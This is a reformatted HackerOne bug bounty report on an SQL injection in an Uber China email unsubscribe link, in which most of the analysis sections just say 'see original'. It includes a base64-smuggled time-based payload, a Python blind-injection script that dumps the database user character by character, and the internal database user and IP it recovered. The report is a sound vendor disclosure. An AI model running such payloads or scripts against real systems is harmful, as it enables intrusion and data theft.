# SQL Injection on sctrack.email.uber.com.cn

## Metadata
- **Source:** HackerOne
- **Report:** 150156 | https://hackerone.com/reports/150156
- **Submitted:** 2016-07-09
- **Reporter:** orange
- **Program:** Unknown
- **Bounty:** $4,000
- **Severity:** unknown
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
Hi, Uber Security team

I just traveled to China,  when I call Uber in China. I received an advertisement mail from Uber and I found the unsubscribe link is different from the original unsubscribe link, and there is a SQL Injection under the unsubscribe link.

You can see where to find the unsubscribe link from the attachments.

The parameter of user_id is suffered from SQL Injection.

Payload
```

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi, Uber Security team

I just traveled to China,  when I call Uber in China. I received an advertisement mail from Uber and I found the unsubscribe link is different from the original unsubscribe link, and there is a SQL Injection under the unsubscribe link.

You can see where to find the unsubscribe link from the attachments.

The parameter of user_id is suffered from SQL Injection.

Payload
```
http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==
```

You can see the server sleep 12 seconds.

I write a script to dump the database name and user name.
```
import json
import string
import requests
from urllib import quote
from base64 import b64encode

base = string.digits + '_-@.'
payload = {"user_id": 5755, "receiver": "blog.orange.tw"}

for l in range(0, 30):
    for i in 'i'+base:
        payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload)
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))

        if len(r.content)>0:
            print i,
            break
```

The username of mysql user is `sendcloud_w@10.9.79.210`
The database name is `sendcloud`




</details>

---
*Analysed by Claude on 2026-05-24*
